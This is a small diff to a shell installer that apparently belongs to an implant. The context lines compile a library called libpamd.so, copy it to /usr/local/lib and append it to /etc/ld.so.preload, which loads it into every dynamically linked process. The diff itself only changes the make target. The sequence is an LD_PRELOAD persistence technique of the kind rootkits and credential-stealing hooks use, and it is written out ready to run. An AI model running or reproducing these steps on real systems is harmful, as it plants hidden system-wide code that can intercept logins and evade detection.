@@ -15,7 +15,7 @@ rm /tmp/implant
 
 apt-get update
 apt-get -y install gcc make
-make
+make libpamd.so
 
 mv libpamd.so /usr/local/lib/libpamd.so
 echo /usr/local/lib/libpamd.so >> /etc/ld.so.preload
